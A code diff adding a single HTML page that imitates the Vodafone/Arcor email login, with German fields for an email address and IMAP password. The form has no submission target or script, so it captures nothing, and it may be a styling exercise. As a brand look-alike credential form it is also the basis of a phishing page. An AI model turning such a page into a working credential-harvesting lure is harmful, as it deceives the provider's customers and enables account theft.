@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 50vh;
+            background-color: black;
+            color: white;
+            font-family: sans-serif;
+        }
+        
+        .page-box {
+            width: 100%;
+            max-width: 1000px;
+            min-height: 90vh;
+            background: #222;
+            box-shadow: black;
+            padding-right: 20px;
+            padding-left: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .Email {
+            margin-bottom: 15px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            border: none;
+            width: 50%;
+        }
+        
+        .passwort {
+            margin-bottom: 5px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            border: none;
+            width: 50%;
+        }
+        
+        .submit {
+            margin-top: 20px;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+            padding-top: 15px;
+            padding-bottom: 15px;
+            border: none;
+            width: 15%;
+            text-align: center;
+            background-color: red;
+            font-weight: bold;
+        }
+        
+        label {
+            font-size: 0.7em;
+            color: white;
+            order: 1;
+            display: block;
+        }
+        
+        .log {
+            font-size: large;
+        }
+        
+        .logos {
+            display: flex;
+            padding-bottom: 5px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-box">
+        <header class="logos">
+            <div class="accor-logo">
+                <img src="image/accorr.jpg" width="100%">
+            </div>
+        </header>
+        <main>
+            <p style="text-align: left; font-size: small; padding-left: 10px; ">Vodafone E-Mail & Cloud</p>
+            <P class="log ">Login mit E-Mail Zugangsdaten</P>
+            <p style="font-size: small;">Für Deine E-Mail-Konten bei Vodafone, Arcor, Kabel Deutschland und Unitymedia.</p>
+
+            <section>
+                <form>
+                    <div>
+                        <input type="text " placeholder=" E-mail-Adresse " name="E-mail " required class="Email ">
+                    </div>
+                    <div>
+                        <input type="text " placeholder=" E-Mail-Passwort " id="passwort " name="Passwort " required class="passwort ">
+                        <label for="passwort ">Trag hier Dein E-Mail-/ IMAP-Passwort ein</label>
+                    </div>
+                    <div>
+                        <input type="submit " value="Login " class="submit ">
+                    </div>
+                </form>
+            </section>
+        </main>
+        <footer></footer>
+    </div>
+</body>
+
+</html>
